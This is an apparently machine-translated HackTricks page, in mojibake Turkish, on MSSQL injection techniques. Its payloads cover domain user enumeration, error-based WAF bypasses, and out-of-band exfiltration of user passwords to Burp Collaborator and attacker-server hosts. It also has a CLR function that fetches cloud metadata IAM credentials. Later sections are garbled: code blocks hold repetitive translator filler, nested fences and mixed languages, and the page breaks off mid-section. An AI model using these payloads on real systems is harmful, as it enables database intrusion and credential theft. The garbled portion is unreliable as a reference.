# MSSQL Enjeksiyonu

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramanla Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## Active Directory numaralandÄ±rma

Bir MSSQL sunucusu iÃ§inde SQL enjeksiyonu kullanarak **etki alanÄ± kullanÄ±cÄ±larÄ±nÄ± numaralandÄ±rmak mÃ¼mkÃ¼n olabilir**. Bunun iÃ§in aÅŸaÄŸÄ±daki MSSQL fonksiyonlarÄ±nÄ± kullanabilirsiniz:

* **`SELECT DEFAULT_DOMAIN()`**: GeÃ§erli etki alanÄ± adÄ±nÄ± alÄ±r.
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: EÄŸer etki alanÄ±nÄ±n adÄ±nÄ± biliyorsanÄ±z (_bu Ã¶rnekte DOMAIN_), bu fonksiyon **hex formatÄ±nda kullanÄ±cÄ±nÄ±n Administrator SID'sini** dÃ¶ndÃ¼recektir. Bu, `0x01050000000[...]0000f401` gibi gÃ¶rÃ¼necektir, **son 4 byte'Ä±n** bÃ¼yÃ¼k uÃ§lu formatÄ±nda **500** sayÄ±sÄ± olduÄŸuna dikkat edin, bu da **yÃ¶netici kullanÄ±cÄ±sÄ±nÄ±n genel ID'si** olan.\
Bu fonksiyon, **etki alanÄ±nÄ±n ID'sini** (son 4 byte hariÃ§ tÃ¼m byte'lar) bilmenizi saÄŸlar.
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : Bu fonksiyon, belirtilen ID'nin **kullanÄ±cÄ± adÄ±nÄ±** (varsa) dÃ¶ndÃ¼recektir, bu durumda bÃ¼yÃ¼k uÃ§lu == **1000** olan **0000e803** (genellikle bu, oluÅŸturulan ilk dÃ¼zenli kullanÄ±cÄ± ID'sidir). ArdÄ±ndan, 1000 ila 2000 arasÄ±ndaki kullanÄ±cÄ± ID'lerini brute-force yaparak muhtemelen etki alanÄ±nÄ±n tÃ¼m kullanÄ±cÄ±larÄ±nÄ±n kullanÄ±cÄ± adlarÄ±nÄ± elde edebilirsiniz. Ã–rneÄŸin aÅŸaÄŸÄ±daki gibi bir fonksiyon kullanarak:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **Alternatif Hata TabanlÄ± vektÃ¶rler**

Hata tabanlÄ± SQL enjeksiyonlarÄ± genellikle `+AND+1=@@version--` gibi yapÄ±larla benzerlik gÃ¶sterir ve Â«ORÂ» operatÃ¶rÃ¼ne dayanan varyantlar iÃ§erir. Bu tÃ¼r ifadeleri iÃ§eren sorgular genellikle WAF'lar tarafÄ±ndan engellenir. Bir bypass olarak, aranan veride bir veri tÃ¼rÃ¼ dÃ¶nÃ¼ÅŸÃ¼m hatasÄ± tetikleyen belirli fonksiyon Ã§aÄŸrÄ±larÄ±nÄ±n sonucunu %2b karakterini kullanarak bir dize ile birleÅŸtirin.

Bu tÃ¼r fonksiyonlara Ã¶rnekler:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

Fonksiyon `USER_NAME()`'in Ã¶rnek kullanÄ±mÄ±:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

Bu SSRF hileleri [buradan alÄ±nmÄ±ÅŸtÄ±r](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

### `fn_xe_file_target_read_file`

Sunucuda **`VIEW SERVER STATE`** izni gerektirir.
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

Bu, **`CONTROL SERVER`** iznine ihtiyaÃ§ duyar.
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

Bu, **`CONTROL SERVER`** iznine ihtiyaÃ§ duyar.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

`xp_dirtree` gibi depolanan prosedÃ¼rler, Microsoft tarafÄ±ndan resmi olarak belgelenmemiÅŸ olsalar da, MSSQL iÃ§inde aÄŸ iÅŸlemlerindeki kullanÄ±ÅŸlÄ±lÄ±klarÄ± nedeniyle baÅŸkalarÄ± tarafÄ±ndan Ã§evrimiÃ§i olarak aÃ§Ä±klanmÄ±ÅŸtÄ±r. Bu prosedÃ¼rler, Ã§eÅŸitli [Ã¶rneklerde](https://www.notsosecure.com/oob-exploitation-cheatsheet/) ve [gÃ¶nderilerde](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/) gÃ¶sterildiÄŸi gibi, Out of Band Veri sÄ±zdÄ±rma iÅŸlemlerinde sÄ±klÄ±kla kullanÄ±lÄ±r.

Ã–rneÄŸin, `xp_dirtree` depolanan prosedÃ¼rÃ¼, aÄŸ istekleri yapmak iÃ§in kullanÄ±lÄ±r, ancak yalnÄ±zca TCP baÄŸlantÄ± noktasÄ± 445'e izin verir. BaÄŸlantÄ± noktasÄ± numarasÄ± deÄŸiÅŸtirilemez, ancak aÄŸ paylaÅŸÄ±mlarÄ±ndan okuma yapmaya izin verir. KullanÄ±mÄ± aÅŸaÄŸÄ±daki SQL betiÄŸinde gÃ¶sterilmiÅŸtir:
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```
Bu yÃ¶ntemin, varsayÄ±lan ayarlarla Ã§alÄ±ÅŸan `Windows Server 2016 Datacenter` Ã¼zerinde Ã§alÄ±ÅŸan `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` gibi tÃ¼m sistem yapÄ±landÄ±rmalarÄ±nda Ã§alÄ±ÅŸmayabileceÄŸi Ã¶nemlidir.

AyrÄ±ca, `master..xp_fileexist` ve `xp_subdirs` gibi alternatif depolanan prosedÃ¼rler de benzer sonuÃ§lara ulaÅŸabilir. `xp_fileexist` hakkÄ±nda daha fazla bilgi iÃ§in bu [TechNet makalesine](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx) bakabilirsiniz.


### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

AyrÄ±ca **`xp_cmdshell`** kullanarak bir **SSRF** tetikleyen bir ÅŸeyi **yÃ¼rÃ¼tmek** iÃ§in de kullanabilirsiniz. Daha fazla bilgi iÃ§in sayfadaki ilgili bÃ¶lÃ¼mÃ¼ **okuyun**:

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL KullanÄ±cÄ± TanÄ±mlÄ± Fonksiyon - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Ã–zel iÅŸlevleri yÃ¼rÃ¼tmek iÃ§in MSSQL iÃ§inde yÃ¼klenecek olan bir DLL'ye derlenen herhangi bir .NET dilinde yazÄ±lmÄ±ÅŸ kod olan CLR UDF (Common Language Runtime User Defined Function) oluÅŸturmak, genellikle `sa` olarak veya YÃ¶netici rolÃ¼yle veritabanÄ± baÄŸlantÄ±sÄ± yapÄ±ldÄ±ÄŸÄ±nda mÃ¼mkÃ¼n olur.

Bu iÅŸlevselliÄŸin Ã§ekirdeÄŸi, MSSQL iÃ§indeki HTTP GET isteklerini yÃ¼rÃ¼tmek ve iÃ§eriÄŸi almak iÃ§in `WebClient` sÄ±nÄ±fÄ±nÄ± kullanan `http.cs` dosyasÄ±nda Ã¶zetlenmiÅŸtir. Bu iÅŸlevselliÄŸin Ã§ekirdeÄŸi aÅŸaÄŸÄ±daki gibi gÃ¶sterilir:
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString(html);
}
}
```
`CREATE ASSEMBLY` SQL komutunu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce, sunucunun gÃ¼venilir derlemeler listesine ( `select * from sys.trusted_assemblies;` ile gÃ¶rÃ¼ntÃ¼lenebilir) derlemenin SHA512 karma deÄŸerini eklemek iÃ§in aÅŸaÄŸÄ±daki SQL parÃ§acÄ±ÄŸÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak Ã¶nerilir:
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
BaÅŸarÄ±yla derleme eklenip fonksiyon oluÅŸturulduktan sonra, aÅŸaÄŸÄ±daki SQL kodu HTTP isteklerini gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±labilir:
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
### **HÄ±zlÄ± SÃ¶mÃ¼rÃ¼: Bir Sorguda TÃ¼m Tablo Ä°Ã§eriÄŸini Almak**

[Ä°ÅŸte buradan alÄ±nan bir hile](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

Bir tablonun tam iÃ§eriÄŸini tek bir sorguda Ã§Ä±karmak iÃ§in Ã¶zlÃ¼ bir yÃ¶ntem, `FOR JSON` ifadesini kullanmaktÄ±r. Bu yaklaÅŸÄ±m, "raw" gibi belirli bir mod gerektiren `FOR XML` ifadesinden daha Ã¶zlÃ¼dÃ¼r. `FOR JSON` ifadesi, kÄ±salÄ±ÄŸÄ± nedeniyle tercih edilir.

Ä°ÅŸte mevcut veritabanÄ±ndan ÅŸema, tablolar ve sÃ¼tunlarÄ± nasÄ±l alacaÄŸÄ±nÄ±z:
```sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it's crucial to provide an alias or a name. This is because the output of expressions, if not provided with either, cannot be formatted as JSON. Here's an example of how this is done:

```sql
## MSSQL Injection

Bu bÃ¶lÃ¼mde, MSSQL veritabanÄ± Ã¼zerinde SQL enjeksiyonu saldÄ±rÄ±larÄ± hakkÄ±nda bilgi bulacaksÄ±nÄ±z. SQL enjeksiyonu, bir web uygulamasÄ±nÄ±n gÃ¼venlik aÃ§Ä±klarÄ±nÄ± kullanarak veritabanÄ±na kÃ¶tÃ¼ niyetli SQL kodu enjekte etme iÅŸlemidir. Bu saldÄ±rÄ± tÃ¼rÃ¼, kullanÄ±cÄ± giriÅŸlerinin doÄŸru bir ÅŸekilde filtrelenmediÄŸi veya doÄŸru bir ÅŸekilde iÅŸlenmediÄŸi durumlarda gerÃ§ekleÅŸir.

### MSSQL Enjeksiyonu TÃ¼rleri

MSSQL enjeksiyonu, Ã§eÅŸitli yÃ¶ntemlerle gerÃ§ekleÅŸtirilebilir. Ä°ÅŸte en yaygÄ±n kullanÄ±lan MSSQL enjeksiyon tÃ¼rleri:

- **Union-Based Enjeksiyon**: Bu yÃ¶ntemde, UNION operatÃ¶rÃ¼ kullanÄ±larak veritabanÄ±ndan veri Ã§ekilir.
- **Boolean-Based Enjeksiyon**: Bu yÃ¶ntemde, SQL sorgusunun sonucunu doÄŸru veya yanlÄ±ÅŸ ifadelerle kontrol ederek veri Ã§ekilir.
- **Time-Based Enjeksiyon**: Bu yÃ¶ntemde, SQL sorgusunun Ã§alÄ±ÅŸma sÃ¼resini kontrol ederek veri Ã§ekilir.
- **Error-Based Enjeksiyon**: Bu yÃ¶ntemde, SQL sorgusunda hata oluÅŸturularak veri Ã§ekilir.

### MSSQL Enjeksiyonu Ã–rneÄŸi

AÅŸaÄŸÄ±daki Ã¶rnek, MSSQL enjeksiyonunun nasÄ±l gerÃ§ekleÅŸtirileceÄŸini gÃ¶stermektedir:

```plaintext
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```

Bu URL'de, `id` parametresine eklenen `'` karakteri ile SQL enjeksiyonu gerÃ§ekleÅŸtirilmektedir. SQL sorgusunda `UNION` veya `SELECT` gibi operatÃ¶rler kullanÄ±larak veritabanÄ±ndan veri Ã§ekilmektedir.
```

### Retrieving the Current Query

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

For users granted the `VIEW SERVER STATE` permission on the server, it's possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:

```sql
## MSSQL Injection

Bu bÃ¶lÃ¼mde, MSSQL veritabanlarÄ±nda SQL enjeksiyonu saldÄ±rÄ±larÄ±na odaklanacaÄŸÄ±z. SQL enjeksiyonu, bir uygulamanÄ±n veritabanÄ± sorgularÄ±na kÃ¶tÃ¼ niyetli SQL kodu enjekte ederek saldÄ±rganÄ±n veritabanÄ±na yetkisiz eriÅŸim elde etmesine olanak tanÄ±r.

### Union SaldÄ±rÄ±sÄ±

Union saldÄ±rÄ±sÄ±, SQL enjeksiyonunun en yaygÄ±n kullanÄ±lan yÃ¶ntemlerinden biridir. Bu saldÄ±rÄ±da, UNION operatÃ¶rÃ¼ kullanÄ±larak iki veya daha fazla sorgunun sonuÃ§larÄ± birleÅŸtirilir. Bu sayede saldÄ±rgan, hedef uygulamanÄ±n veritabanÄ±ndan istediÄŸi bilgileri Ã§ekebilir.

AÅŸaÄŸÄ±daki Ã¶rnek, UNION saldÄ±rÄ±sÄ±nÄ±n bir Ã¶rneÄŸini gÃ¶stermektedir:

```
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```

Bu saldÄ±rÄ±da, `id` parametresine `-1 union select null,(select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)),null,null` deÄŸeri verilmiÅŸtir. Bu deÄŸer, UNION operatÃ¶rÃ¼ kullanÄ±larak birincil sorgunun sonucuna ek olarak `sys.dm_exec_requests` ve `sys.dm_exec_sql_text` tablolarÄ±ndan bilgi Ã§ekmektedir.

Bu saldÄ±rÄ±, hedef uygulamanÄ±n veritabanÄ±nda bulunan verileri Ã§almak veya manipÃ¼le etmek iÃ§in kullanÄ±labilir. SaldÄ±rgan, UNION saldÄ±rÄ±sÄ±nÄ± kullanarak veritabanÄ± yapÄ±sÄ±nÄ± keÅŸfedebilir, kullanÄ±cÄ± kimlik bilgilerini ele geÃ§irebilir veya hassas verileri sÄ±zdÄ±rabilir.

Bu nedenle, uygulama geliÅŸtiricilerinin SQL enjeksiyonu saldÄ±rÄ±larÄ±na karÅŸÄ± koruma Ã¶nlemleri almasÄ± Ã¶nemlidir. Bu Ã¶nlemler arasÄ±nda parametre baÄŸlama, giriÅŸ doÄŸrulama ve filtreleme gibi gÃ¼venlik kontrolleri bulunur.
```

To check if you have the VIEW SERVER STATE permission, the following query can be used:

```sql
```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```

Bu sorgu, 'SERVER' izin tÃ¼rÃ¼ne sahip olan 'VIEW SERVER STATE' iznine sahip kullanÄ±cÄ±larÄ±n tÃ¼m izinlerini dÃ¶ndÃ¼rÃ¼r.
```

## **Little tricks for WAF bypasses**

[Tricks also from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

Non-standard whitespace characters: %C2%85 Ğ¸Ğ»Ğ¸ %C2%A0:

```
# MSSQL Injection

Bu bÃ¶lÃ¼mde, MSSQL veritabanÄ± Ã¼zerinde SQL enjeksiyonu saldÄ±rÄ±larÄ±na odaklanacaÄŸÄ±z. SQL enjeksiyonu, bir web uygulamasÄ±nÄ±n veritabanÄ± sorgularÄ±na kÃ¶tÃ¼ niyetli SQL kodu enjekte ederek saldÄ±rganÄ±n istismar etmesine izin verir.

## MSSQL Enjeksiyonu Temelleri

MSSQL enjeksiyonu, bir web uygulamasÄ±nÄ±n giriÅŸ alanlarÄ±na veya parametrelerine kÃ¶tÃ¼ niyetli SQL kodu enjekte ederek gerÃ§ekleÅŸtirilir. Bu, saldÄ±rganÄ±n veritabanÄ± sorgularÄ±nÄ± manipÃ¼le etmesine ve istediÄŸi verilere eriÅŸmesine olanak tanÄ±r.

MSSQL enjeksiyonu saldÄ±rÄ±larÄ±nda yaygÄ±n olarak kullanÄ±lan bazÄ± teknikler ÅŸunlardÄ±r:

- **Union SaldÄ±rÄ±larÄ±**: BirleÅŸtirme (union) operatÃ¶rÃ¼ kullanÄ±larak birden fazla sorgunun sonuÃ§larÄ± birleÅŸtirilir. Bu, saldÄ±rganÄ±n veritabanÄ±ndan istediÄŸi verileri almasÄ±nÄ± saÄŸlar.
- **Boolean SaldÄ±rÄ±larÄ±**: SaldÄ±rgan, mantÄ±ksal ifadeleri kullanarak doÄŸru veya yanlÄ±ÅŸ sonuÃ§lar elde eder. Bu, veritabanÄ±ndaki bilgilerin doÄŸruluÄŸunu doÄŸrulamak iÃ§in kullanÄ±lÄ±r.
- **Time-Based SaldÄ±rÄ±lar**: SaldÄ±rgan, zaman gecikmelerini kullanarak veritabanÄ± sorgularÄ±nÄ±n sonuÃ§larÄ±nÄ± kontrol eder. Bu, saldÄ±rganÄ±n veritabanÄ±ndan bilgi Ã§ekmesini saÄŸlar.

## Union SaldÄ±rÄ±larÄ±

Union saldÄ±rÄ±larÄ±, birleÅŸtirme (union) operatÃ¶rÃ¼nÃ¼n kullanÄ±ldÄ±ÄŸÄ± SQL enjeksiyonu saldÄ±rÄ±larÄ±dÄ±r. Bu saldÄ±rÄ±lar, birleÅŸtirme operatÃ¶rÃ¼ kullanÄ±larak birden fazla sorgunun sonuÃ§larÄ±nÄ±n birleÅŸtirilmesini hedefler.

AÅŸaÄŸÄ±daki Ã¶rnek URL'de union saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirilmektedir:

```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```

Bu URL'de, `id` parametresine `1%C2%85union%C2%85select%C2%A0null,@@version,null--` deÄŸeri verilmiÅŸtir. Bu deÄŸer, union saldÄ±rÄ±sÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lan SQL kodunu iÃ§erir.

Union saldÄ±rÄ±sÄ±, `union` operatÃ¶rÃ¼ kullanÄ±larak birden fazla sorgunun sonuÃ§larÄ±nÄ±n birleÅŸtirilmesini saÄŸlar. Bu Ã¶rnekte, `null` deÄŸeri kullanÄ±larak ilk sorgunun sonucu atlanÄ±rken, `@@version` deÄŸeri kullanÄ±larak MSSQL veritabanÄ± sÃ¼rÃ¼mÃ¼ elde edilmektedir.

SaldÄ±rgan, union saldÄ±rÄ±sÄ± kullanarak veritabanÄ±ndan istediÄŸi verilere eriÅŸebilir. Bu nedenle, web uygulamalarÄ±nÄ±n giriÅŸ alanlarÄ± ve parametreleri dikkatlice kontrol edilmeli ve gerekli gÃ¼venlik Ã¶nlemleri alÄ±nmalÄ±dÄ±r.
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
## MSSQL Enjeksiyonu

Bu bÃ¶lÃ¼mde, MSSQL veritabanÄ± Ã¼zerinde SQL enjeksiyonu saldÄ±rÄ±larÄ±na odaklanacaÄŸÄ±z. SQL enjeksiyonu, bir web uygulamasÄ±nÄ±n veritabanÄ± sorgularÄ±na zararlÄ± SQL kodu enjekte ederek saldÄ±rganÄ±n istediÄŸi iÅŸlemleri gerÃ§ekleÅŸtirmesine olanak tanÄ±r.

### MSSQL Enjeksiyonu Temelleri

MSSQL enjeksiyonu, web uygulamasÄ±nÄ±n giriÅŸ alanlarÄ±na veya parametrelerine zararlÄ± SQL kodu enjekte ederek gerÃ§ekleÅŸtirilir. Bu kod, veritabanÄ± sorgularÄ±nÄ±n normal iÅŸleyiÅŸini bozarak saldÄ±rganÄ±n istediÄŸi verilere eriÅŸmesini veya deÄŸiÅŸtirmesini saÄŸlar.

MSSQL enjeksiyonu saldÄ±rÄ±larÄ±nda, saldÄ±rganÄ±n hedeflediÄŸi SQL kodu, web uygulamasÄ±nÄ±n veritabanÄ± sorgularÄ±na eklenir. Bu kod, veritabanÄ± tarafÄ±ndan doÄŸrudan yorumlanÄ±r ve sonuÃ§lar web uygulamasÄ±na geri dÃ¶ner. SaldÄ±rgan, bu yolla veritabanÄ± Ã¼zerinde Ã§eÅŸitli iÅŸlemler gerÃ§ekleÅŸtirebilir.

### MSSQL Enjeksiyonu Ã–rnekleri

AÅŸaÄŸÄ±da, MSSQL enjeksiyonu iÃ§in bazÄ± Ã¶rnekler verilmiÅŸtir:

```plaintext
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```

YukarÄ±daki Ã¶rneklerde, `id` parametresine zararlÄ± SQL kodu enjekte edilmiÅŸtir. `union select` ifadesi kullanÄ±larak `@@version` fonksiyonu Ã§aÄŸrÄ±lmÄ±ÅŸ ve sonuÃ§lar `null` olarak dÃ¶ndÃ¼rÃ¼lmÃ¼ÅŸtÃ¼r.

Bu tÃ¼r bir enjeksiyon saldÄ±rÄ±sÄ±, saldÄ±rganÄ±n MSSQL veritabanÄ± hakkÄ±nda bilgi edinmesini saÄŸlar. `@@version` fonksiyonu, veritabanÄ± sÃ¼rÃ¼mÃ¼nÃ¼ dÃ¶ndÃ¼rÃ¼r. SaldÄ±rgan, bu bilgiyi kullanarak hedef sistemi daha fazla zafiyet iÃ§in analiz edebilir.

### Ã–nleme

MSSQL enjeksiyonu saldÄ±rÄ±larÄ±ndan korunmak iÃ§in aÅŸaÄŸÄ±daki Ã¶nlemleri alabilirsiniz:

- GiriÅŸ alanlarÄ±nÄ± doÄŸru bir ÅŸekilde doÄŸrulayÄ±n ve filtreleyin.
- Parametreleri gÃ¼venli bir ÅŸekilde iÅŸleyin ve sorgularÄ± hazÄ±rlarken parametre baÄŸlama kullanÄ±n.
- GÃ¼venlik duvarÄ± ve saldÄ±rÄ± tespit sistemleri kullanarak saldÄ±rÄ±larÄ± engelleyin.
- VeritabanÄ± kullanÄ±cÄ±larÄ±nÄ±n minimum ayrÄ±calÄ±klara sahip olduÄŸundan emin olun.
- GÃ¼ncel ve gÃ¼venli bir MSSQL sÃ¼rÃ¼mÃ¼ kullanÄ±n.

Bu Ã¶nlemler, MSSQL enjeksiyonu saldÄ±rÄ±larÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olabilir. Ancak, her zaman gÃ¼ncel gÃ¼venlik uygulamalarÄ±nÄ± takip etmek ve web uygulamalarÄ±nÄ± dÃ¼zenli olarak test etmek Ã¶nemlidir.
```

A period instead of a whitespace between FROM and a column name:

```
# MSSQL Injection

Bu bÃ¶lÃ¼mde, MSSQL veritabanÄ± Ã¼zerinde SQL enjeksiyonu saldÄ±rÄ±larÄ±na odaklanacaÄŸÄ±z. SQL enjeksiyonu, bir web uygulamasÄ±nÄ±n veritabanÄ± sorgularÄ±na kÃ¶tÃ¼ niyetli SQL kodu enjekte ederek saldÄ±rganÄ±n istismar etmesine izin veren bir gÃ¼venlik aÃ§Ä±ÄŸÄ±dÄ±r.

## MSSQL Enjeksiyonu Temelleri

MSSQL enjeksiyonu, bir web uygulamasÄ±nÄ±n giriÅŸ alanlarÄ±na veya parametrelerine kÃ¶tÃ¼ niyetli SQL kodu enjekte ederek gerÃ§ekleÅŸtirilir. Bu, saldÄ±rganÄ±n veritabanÄ± sorgularÄ±nÄ± manipÃ¼le etmesine ve istediÄŸi bilgilere eriÅŸmesine olanak tanÄ±r.

MSSQL enjeksiyonu saldÄ±rÄ±larÄ±nda yaygÄ±n olarak kullanÄ±lan bazÄ± teknikler ÅŸunlardÄ±r:

- **Union SaldÄ±rÄ±sÄ±**: BirleÅŸtirme saldÄ±rÄ±sÄ±, UNION operatÃ¶rÃ¼nÃ¼ kullanarak bir SQL sorgusuna ek veri eklemeyi iÃ§erir. Bu, saldÄ±rganÄ±n veritabanÄ±ndan istediÄŸi bilgileri Ã§ekmesine olanak tanÄ±r.
- **Boolean SaldÄ±rÄ±sÄ±**: Boolean saldÄ±rÄ±sÄ±, saldÄ±rganÄ±n SQL sorgusunu doÄŸru veya yanlÄ±ÅŸ sonuÃ§larla sÄ±nÄ±rlayarak bilgi elde etmesini saÄŸlar. Bu, veritabanÄ±ndaki bilgilerin doÄŸruluÄŸunu test etmek iÃ§in kullanÄ±labilir.
- **Time-Based SaldÄ±rÄ±**: Time-based saldÄ±rÄ±, saldÄ±rganÄ±n SQL sorgusunun yanÄ±t sÃ¼resini manipÃ¼le ederek bilgi elde etmesini saÄŸlar. Bu, veritabanÄ±ndaki bilgilerin varlÄ±ÄŸÄ±nÄ± veya doÄŸruluÄŸunu test etmek iÃ§in kullanÄ±labilir.

## MSSQL Enjeksiyonu Ã–rneÄŸi

AÅŸaÄŸÄ±daki Ã¶rnek, bir web uygulamasÄ±nda MSSQL enjeksiyonu saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lan bir URL'yi gÃ¶stermektedir:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```

Bu URL, `id` parametresine `1 union select null,@@version,null from.users--` deÄŸerini ekleyerek birleÅŸtirme saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirir. Bu saldÄ±rÄ±, `@@version` fonksiyonunu kullanarak MSSQL veritabanÄ± sÃ¼rÃ¼mÃ¼nÃ¼ elde etmeyi amaÃ§lar.

SaldÄ±rgan, bu saldÄ±rÄ±yÄ± kullanarak hedef web uygulamasÄ±nÄ±n veritabanÄ± sÃ¼rÃ¼mÃ¼nÃ¼ Ã¶ÄŸrenebilir ve bu bilgiyi daha fazla saldÄ±rÄ± veya istismar iÃ§in kullanabilir.

Bu Ã¶rnek, MSSQL enjeksiyonunun temel bir Ã¶rneÄŸini gÃ¶stermektedir. GerÃ§ek saldÄ±rÄ±lar daha karmaÅŸÄ±k olabilir ve farklÄ± teknikler kullanabilir.
```

\N separator between SELECT and a throwaway column:

```
# MSSQL Injection

Bu bÃ¶lÃ¼mde, MSSQL veritabanÄ±nda SQL enjeksiyonu saldÄ±rÄ±larÄ±na odaklanacaÄŸÄ±z. SQL enjeksiyonu, bir web uygulamasÄ±nÄ±n veritabanÄ± sorgularÄ±na kÃ¶tÃ¼ niyetli SQL kodu enjekte ederek saldÄ±rganÄ±n istismar etmesine izin veren bir gÃ¼venlik aÃ§Ä±ÄŸÄ±dÄ±r.

## MSSQL Enjeksiyonu Temelleri

